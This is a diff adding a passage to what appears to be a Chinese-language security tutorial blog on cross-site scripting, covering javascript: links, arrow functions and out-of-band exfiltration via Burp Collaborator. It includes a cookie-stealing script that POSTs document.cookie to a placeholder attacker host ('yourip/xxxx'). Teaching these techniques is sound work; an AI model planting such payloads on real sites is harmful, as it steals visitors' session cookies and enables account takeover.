@@ -155,6 +155,40 @@
 <p><img src="http://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202207201551089.png" alt="image-20220720155125043"></p>
 <p>当然还有其他的Dom事件 这里就不多说了</p>
 <p><a target="_blank" rel="noopener" href="https://www.runoob.com/jsref/dom-obj-event.html">HTML DOM 事件对象 | 菜鸟教程 (runoob.com)</a></p>
+<p>这里还有一种触发方式 ——JavaScript伪协议 </p>
+<figure class="highlight javascript"><button class="btn-copy" data-clipboard-snippet="" title="复制"><img src="//cdn.jsdelivr.net/gh/5MayRain/ImageHosting/Blog/Website/icon/copy.svg" /></button><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=<span class="string">&quot;javascript:alert(1)&quot;</span>&gt;clickme to alert&lt;/a&gt;</span><br></pre></td></tr></table></figure>
+
+<p><code>javascript:</code>后的东西将被作为JavaScript代码执行 这里有一个好玩的点 如果我们不想让a标签中的超链接跳转 那么我们可以将上面代码写成下面的样子</p>
+<figure class="highlight javascript"><button class="btn-copy" data-clipboard-snippet="" title="复制"><img src="//cdn.jsdelivr.net/gh/5MayRain/ImageHosting/Blog/Website/icon/copy.svg" /></button><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=<span class="string">&quot;javascript:&quot;</span>&gt;clickme to alert&lt;/a&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:void(0)&quot;</span>&gt;</span>clickme to alert<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
+
+<p>当伪协议后没有代码时 也就是点击超链接执行空的JavaScript代码 自然也不会有跳转了</p>
+<h2 id="XSS的利用"><a href="#XSS的利用" class="headerlink" title="XSS的利用"></a>XSS的利用</h2><p>JavaScript中 提供了一种独特的构造函数方式</p>
+<p>先看一种最基础的</p>
+<figure class="highlight javascript"><button class="btn-copy" data-clipboard-snippet="" title="复制"><img src="//cdn.jsdelivr.net/gh/5MayRain/ImageHosting/Blog/Website/icon/copy.svg" /></button><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">myfunction</span>(<span class="params">arg</span>)</span><br><span class="line">&#123;</span><br><span class="line">		<span class="title function_">alert</span>(arg);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这个函数也可以写成 这就是JavaScript的箭头函数</p>
+<figure class="highlight javascript"><button class="btn-copy" data-clipboard-snippet="" title="复制"><img src="//cdn.jsdelivr.net/gh/5MayRain/ImageHosting/Blog/Website/icon/copy.svg" /></button><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">myfunction=<span class="function"><span class="params">arg</span>=&gt;</span>&#123;<span class="title function_">alert</span>(arg)&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202207232218843.png" alt="image-20220723221834768"></p>
+<p>在nodejs中提供了access模块进行http的请求 那么在JavaScript中我们应该怎么与网站进行请求交互 所以在JavaScript中提供了接口fetch </p>
+<p>那么我们想象这样一种情况 如果某一网站有xss漏洞 并且我们将如下代码写入到网站中</p>
+<figure class="highlight javascript"><button class="btn-copy" data-clipboard-snippet="" title="复制"><img src="//cdn.jsdelivr.net/gh/5MayRain/ImageHosting/Blog/Website/icon/copy.svg" /></button><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="title function_">fetch</span>(<span class="string">&#x27;yourip/xxxx&#x27;</span>,</span><br><span class="line">&#123;</span><br><span class="line"><span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line"><span class="attr">mode</span>: <span class="string">&#x27;no-cors&#x27;</span>,</span><br><span class="line"><span class="attr">body</span>:<span class="variable language_">document</span>.<span class="property">cookie</span></span><br><span class="line">&#125;);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>那么当其他用户进入该网站时也会触发这段代码 这段代码会将携带访问者cookie的数据包发送到你的服务器上 那么我们是不是就可以利用该cookie达到csrf的效果了呢 （关于什么时CSRF 移步下面链接）</p>
+<p><a href="https://y1zh3e7.github.io/2022/04/22/CSRF%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/">CSRF跨站请求伪造 - y1zh3e7</a></p>
+<h2 id="XSS-OOB"><a href="#XSS-OOB" class="headerlink" title="XSS OOB"></a>XSS OOB</h2><p>学了很多的漏洞 其实我们回顾一下大部分web产生漏洞的原因都是因为后端对前端用户输入的值没有进行严格过滤  导致了用户输入的恶意代码拼接到后端导致了恶意代码的执行 本质上也就是所谓的注入攻击 提到注入攻击 那么OOB基本就是老生常谈的一个东西了 在以前的各种注入攻击中也提到过 这里再详细讲一下</p>
+<p>在SQL注入 或者是RCE 或者是其他各种的漏洞中 我们一般都是通过网页回显来确定我们的代码是否被成功执行 当然 网站的管理者也会想到这一点 所以很多网站会关闭网页回显 那这个时候我们要怎么查看到网页的回显呢 </p>
+<p>道理很简单 在当前的网页看不到 那么我们将回显发送到其他地方查看不就可以了吗 一般常用的手段是将回显发送到DNSlog 或者自己的服务器上 当然这两样听起来很麻烦 所以直接搬出我们的神器burpsuite（这里建议大家多多更新手头的工具 像我之前用的老版的burp少了很多功能 比如burp自带的浏览器 OOB要使用的Collaborator clienr模块等等）</p>
+<p>在burp的这个模块中 burpsuite会提供一个真实存在的url 方便我们进行各种奇怪的操作</p>
+<p><img src="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202208142309964.png" alt="image-20220814230923888"></p>
+<p>点击<code>Copy to clipboard</code>就可以复制我们的url了</p>
+<p><img src="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202208142310137.png" alt="image-20220814231024106"></p>
+<p>那么我们把上面提到的获取cookie的url改成burp提供的这个 那么就可以直接获取到cookie了</p>
+<p><img src="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202208142327458.png" alt="image-20220814232705400"></p>
+<p>OOB的原理可以看一下这篇</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/fageweiketang/article/details/89073662">(77条消息) Burp Collaborator 使用总结_aFa攻防实验室的博客-CSDN博客_burpcollaborator</a></p>
+<h2 id="XSS-前端模板"><a href="#XSS-前端模板" class="headerlink" title="XSS 前端模板"></a>XSS 前端模板</h2><p>XSS作为一个活跃于前端的漏洞 当然会出现在各种前端模板中 但是前端模板那么多 我们又不可能都去学完 所以burpsuite提供了很多开封即用的payload 我们就可以根据前端模板的种类和版本去使用不同的payload</p>
+<p><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet">https://portswigger.net/web-security/cross-site-scripting/cheat-sheet</a></p>
 
                                     <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
                                     <audio id="audio" loop="1" preload="auto" controls="controls"
